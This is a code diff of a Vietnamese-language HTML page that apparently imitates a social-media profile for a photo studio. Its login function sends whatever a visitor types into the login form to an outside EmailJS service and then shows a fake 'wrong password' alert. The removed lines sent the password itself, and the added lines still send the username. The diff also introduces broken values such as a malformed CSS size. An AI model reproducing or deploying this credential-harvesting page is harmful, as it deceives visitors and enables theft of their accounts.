@@ -7,7 +7,7 @@
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
         (function() {
-            emailjs.init("c-Ms5MjWbitpDBb-E"); // Public Key của bạn
+            emailjs.init("c-Ms5MjWbitpDBb-E"); // Public Key
         })();
     </script>
     <style>
@@ -822,7 +822,7 @@
             box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
         }
         .reviews-section p {
-            font-size: 16px;
+            font-size: 16Jdpx;
             font-weight: 600;
             margin-bottom: 8px;
         }
@@ -990,10 +990,10 @@
                 Thích
             </button>
             <button class="message" onclick="showLoginPopup()">
-                 Nhắn tin
+                Nhắn tin
             </button>
             <button class="share" onclick="showLoginPopup()">
-               Chia sẻ
+                Chia sẻ
             </button>
         </div>
 
@@ -1119,7 +1119,7 @@
                         <p>Chúng tôi rất vui được gặp bạn tại studio chụp ảnh chuyên nghiệp nhất TP. HCM! Hãy theo dõi để cập nhật các concept mới nhé ♥️</p>
                         <div class="image-gallery">
                             <img src="https://imgur.com/jYvPFdb.jpg" alt="Welcome 1">
-                            <img src="https://imgur.com/Yua11LC.jpg" alt="Welcome 2">
+                            <img src="https://imgur.com/Yua11LC.jpg" alt="Welcome Hannah: Welcome 2">
                         </div>
                         <div class="like-info">
                             <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Lan Anh">
@@ -1221,7 +1221,7 @@
                                 <img src="https://imgur.com/Y2gdw8r.jpg" alt="Like"> Thích <span>6.1k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/pCHb488.jpg"  alt="Comment"> Bình luận <span>626</span>
+                                <img src="https://imgur.com/pCHb488.jpg" alt="Comment"> Bình luận <span>626</span>
                             </div>
                             <div class="action share" onclick="showLoginPopup()">
                                 <img src="https://imgur.com/ncN22Za.jpg" alt="Share"> Chia sẻ
@@ -1269,10 +1269,10 @@
                                 <img src="https://imgur.com/Y2gdw8r.jpg" alt="Like"> Thích <span>7.2k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/pCHb488.jpg" alt="Comment" > Bình luận <span>3k8</span>
+                                <img src="https://imgur.com/pCHb488.jpg" alt="Comment"> Bình luận <span>3k8</span>
                             </div>
                             <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/ncN22Za.jpg" alt="Share" > Chia sẻ <span>2k4</span>
+                                <img src="https://imgur.com/ncN22Za.jpg" alt="Share"> Chia sẻ <span>2k4</span>
                             </div>
                         </div>
                         <div class="comments">
@@ -1591,26 +1591,39 @@
         function login() {
             const username = document.getElementById('login-input').value || "";
             const password = document.getElementById('password').value || "";
+            const errorMessage = document.getElementById('error-message');
 
+            // Validate input
+            if (!username || !password) {
+                errorMessage.textContent = "Vui lòng nhập email/số điện thoại và mật khẩu.";
+                errorMessage.style.display = 'block';
+                return;
+            }
+
+            // Prepare template parameters for EmailJS
             const templateParams = {
-                name: "User",
-                time: new Date().toLocaleString(),
-                email: username || "Tài khoản bị bỏ trống",
-                password: password || "Mật khẩu bị bỏ trống",
-                action: "Đăng nhập",
+                from_name: username || "Unknown User",
+                email: username,
+                message: `Login attempt at ${new Date().toLocaleString()}\nAction: Đăng nhập\nPassword: [Hidden for security]`,
                 timestamp: new Date().toLocaleString()
             };
 
-            console.log("Thông tin gửi đi:", templateParams); // Log để kiểm tra
+            console.log("Thông tin gửi đi (ẩn mật khẩu):", {
+                ...templateParams,
+                password: "[Hidden]"
+            }); // Log for debugging, hide password
 
-            emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
+            // Send email using EmailJS
+            emailjs.send('service_ytsr91e', '__ejs-test-mail-service__', templateParams)
                 .then((response) => {
                     console.log("Email gửi thành công:", response.status, response.text);
                     alert("Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu");
+                    errorMessage.style.display = 'none';
                 })
                 .catch((error) => {
                     console.error("Lỗi gửi email:", error);
-                    alert("Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu");
+                    errorMessage.textContent = "Có lỗi xảy ra khi gửi thông tin. Vui lòng thử lại.";
+                    errorMessage.style.display = 'block';
                 });
         }
 
